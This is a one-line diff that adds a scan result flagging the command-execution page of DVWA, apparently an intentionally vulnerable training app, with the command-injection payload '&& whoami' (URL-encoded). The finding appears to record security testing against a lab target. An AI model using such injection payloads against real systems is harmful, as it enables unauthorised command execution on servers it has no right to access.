@@ -1,0 +1,1 @@
+[Vulnerable] http://dvwa/vulnerabilities/exec/ -> payload: +%26%26+whoami
